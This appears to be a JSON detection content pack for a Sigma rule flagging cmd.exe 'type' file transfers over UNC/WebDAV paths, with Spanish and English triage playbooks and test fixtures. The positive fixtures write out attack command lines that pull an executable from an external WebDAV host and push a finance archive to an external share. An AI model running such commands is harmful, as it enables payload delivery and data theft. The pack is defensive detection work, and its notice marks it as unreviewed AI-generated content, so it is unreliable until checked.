@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f",
+    "title": "Potential Download/Upload Activity Using Type Command",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_cmd_type_arbitrary_file_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_cmd_type_arbitrary_file_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso ejecutó el comando integrado \"type\" de cmd.exe con redirección hacia o desde una ruta UNC (\\\\servidor\\...). Esto puede indicar descarga o exfiltración de archivos mediante WebDAV o SMB sin usar herramientas de transferencia tradicionales.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene \"type \" con redirección \" > \\\\\" hacia una ruta UNC (subida), o \"type \\\\\" desde una ruta UNC con redirección \" > \" (descarga). Solo se registra cuando \"type\" se invoca mediante cmd.exe /c, ya que los comandos integrados no generan un proceso propio.",
+      "why_it_matters": "Corresponde a ATT&CK T1105 (Ingress Tool Transfer): el atacante usa un binario nativo (LOLBin) para traer payloads desde un servidor WebDAV remoto o sacar datos, evadiendo controles que vigilan certutil, bitsadmin o PowerShell.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique el archivo de origen, el destino y el host UNC (incluidos sufijos @SSL, @80 o DavWWWRoot que indican WebDAV).",
+        "Determine si el host UNC es un servidor de archivos interno conocido o un dominio/IP externo; consulte su reputación y el DNS del endpoint.",
+        "Examine ParentImage y la cadena de procesos: Office, wscript, mshta o un script descargado como padre de cmd.exe es altamente sospechoso.",
+        "Valide el User y si esa cuenta suele trabajar con rutas UNC o tareas administrativas en ese host.",
+        "En descargas, busque la creación del archivo destino (Sysmon EventID 11), su hash y cualquier ejecución posterior en el mismo host dentro de +/- 15 minutos.",
+        "En subidas, identifique qué archivo se envió y si contiene datos sensibles, credenciales o volcados.",
+        "Revise conexiones de red del host (svchost con el servicio WebClient, puertos 80/443/445) hacia el host UNC en la misma ventana.",
+        "Busque alertas previas para el mismo host, usuario o servidor remoto."
+      ],
+      "false_positives": [
+        "Scripts de inicio de sesión o batch heredados que copian archivos de texto entre recursos compartidos internos usando type y redirección.",
+        "Administradores que consolidan logs o reportes hacia un recurso compartido corporativo conocido."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del script si la actividad es esperada antes de actuar.",
+        "Si es maliciosa, aísle el endpoint y bloquee el host o dominio remoto en proxy, firewall y DNS.",
+        "Ponga en cuarentena el archivo descargado, calcule su hash y búsquelo en toda la flota.",
+        "Si hubo subida de datos, evalúe la exposición, rote credenciales afectadas y escale según el proceso de fuga de información.",
+        "Considere deshabilitar el servicio WebClient donde no se necesite y documente el caso para ajustar la regla."
+      ],
+      "severity_rationale": "Nivel medio porque la técnica es poco común en uso legítimo y permite transferir archivos, pero type con rutas UNC internas puede aparecer en scripts administrativos."
+    },
+    "en": {
+      "summary": "A process ran cmd.exe's built-in \"type\" command with redirection to or from a UNC path (\\\\server\\...). This may indicate file download or exfiltration over WebDAV or SMB without classic transfer tools.",
+      "what_it_detects": "Process creation events whose CommandLine contains \"type \" redirected with \" > \\\\\" to a UNC path (upload), or \"type \\\\\" reading from a UNC path with \" > \" redirection (download). It only fires when type is invoked via cmd.exe /c, since built-in commands spawn no process.",
+      "why_it_matters": "Maps to ATT&CK T1105 (Ingress Tool Transfer): attackers abuse a native binary (LOLBin) to pull payloads from a remote WebDAV server or push data out, bypassing controls focused on certutil, bitsadmin or PowerShell.",
+      "triage_steps": [
+        "Read the full CommandLine: identify source file, destination and UNC host, including @SSL, @80 or DavWWWRoot suffixes that indicate WebDAV.",
+        "Decide whether the UNC host is a known internal file server or an external domain/IP; check reputation and the endpoint's DNS queries.",
+        "Inspect ParentImage and the process chain: Office, wscript, mshta or a dropped script spawning cmd.exe is highly suspicious.",
+        "Validate the User and whether that account normally works with UNC paths or admin tasks on this host.",
+        "For downloads, find the destination file creation (Sysmon EventID 11), its hash and any execution on the same host within +/- 15 minutes.",
+        "For uploads, identify which file was sent and whether it holds sensitive data, credentials or dumps.",
+        "Review host network connections (svchost running WebClient, ports 80/443/445) to the UNC host in the same window.",
+        "Look for earlier alerts for the same host, user or remote server."
+      ],
+      "false_positives": [
+        "Legacy logon or batch scripts copying text files between internal shares with type and redirection.",
+        "Administrators consolidating logs or reports onto a known corporate share."
+      ],
+      "response_steps": [
+        "Confirm with the user or script owner whether the activity is expected before acting.",
+        "If malicious, isolate the endpoint and block the remote host or domain at proxy, firewall and DNS.",
+        "Quarantine the downloaded file, hash it and hunt for it fleet-wide.",
+        "If data was uploaded, assess exposure, rotate affected credentials and escalate per the data-leak process.",
+        "Consider disabling the WebClient service where unneeded and document the case to tune the rule."
+      ],
+      "severity_rationale": "Medium because the technique is rare in legitimate use and enables file transfer, yet type with internal UNC paths can appear in admin scripts."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Download: type reads an executable from a WebDAV UNC path and redirects it to a local file, launched from a script.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c type \\\\198.51.100.20@80\\webdav\\update.exe > C:\\Users\\Public\\update.exe",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "wscript.exe C:\\Users\\jperez\\Downloads\\invoice.js"
+        }
+      },
+      {
+        "description": "Upload: type sends a local archive to an external WebDAV share over SSL.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd /c type C:\\Users\\jperez\\Documents\\finance.zip > \\\\files.example.org@SSL\\DavWWWRoot\\drop\\finance.zip",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Local-only type redirection between two local paths; no UNC path involved.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c type C:\\logs\\app.log > C:\\temp\\app_copy.log",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "type reads a file from a UNC share but pipes it to more instead of redirecting with '>'.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c type \\\\fs01.andes.example.com\\public\\readme.txt | more",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
